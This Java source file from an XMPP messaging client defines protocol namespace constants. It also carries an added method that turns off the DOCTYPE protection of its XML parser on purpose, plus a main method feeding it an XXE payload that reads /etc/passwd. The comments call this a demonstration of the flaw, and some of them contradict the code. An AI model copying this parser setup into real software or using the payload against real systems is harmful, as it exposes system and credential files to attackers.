package eu.siacs.conversations.xml;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import java.io.IOException;
import java.io.StringReader;

public final class Namespace {
    public static final String BLOCKING = "urn:xmpp:blocking";
    public static final String ROSTER = "jabber:iq:roster";
    public static final String REGISTER = "jabber:iq:register";
    public static final String BYTE_STREAMS = "http://jabber.org/protocol/bytestreams";
    public static final String HTTP_UPLOAD = "urn:xmpp:http:upload:0";
    public static final String HTTP_UPLOAD_LEGACY = "urn:xmpp:http:upload";
    public static final String STANZA_IDS = "urn:xmpp:sid:0";
    public static final String IDLE = "urn:xmpp:idle:1";
    public static final String DATA = "jabber:x:data";
    public static final String OOB = "jabber:x:oob";
    public static final String SASL = "urn:ietf:params:xml:ns:xmpp-sasl";
    public static final String TLS = "urn:ietf:params:xml:ns:xmpp-tls";
    public static final String PUBSUB = "http://jabber.org/protocol/pubsub";
    public static final String PUBSUB_PUBLISH_OPTIONS = PUBSUB + "#publish-options";
    public static final String PUBSUB_ERROR = PUBSUB + "#errors";
    public static final String NICK = "http://jabber.org/protocol/nick";
    public static final String FLEXIBLE_OFFLINE_MESSAGE_RETRIEVAL = "http://jabber.org/protocol/offline";
    public static final String BIND = "urn:ietf:params:xml:ns:xmpp-bind";
    public static final String P1_S3_FILE_TRANSFER = "p1:s3filetransfer";

    // Method to demonstrate the XXE vulnerability
    public void parseXML(String xmlData) throws ParserConfigurationException, SAXException, IOException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Vulnerability introduced here: External Entity processing is enabled by default
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false); // Commented out to enable XXE
        factory.setNamespaceAware(true);
        
        try (StringReader reader = new StringReader(xmlData)) {
            factory.newDocumentBuilder().parse(new InputSource(reader));
        }
    }

    public static void main(String[] args) {
        Namespace namespace = new Namespace();
        // Example XML data that includes an external entity
        String maliciousXML = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
                            + "<!DOCTYPE foo ["
                            + "  <!ELEMENT foo ANY >"
                            + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
                            + "<foo>&xxe;</foo>";

        try {
            namespace.parseXML(maliciousXML); // This will read /etc/passwd if XXE is not disabled
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}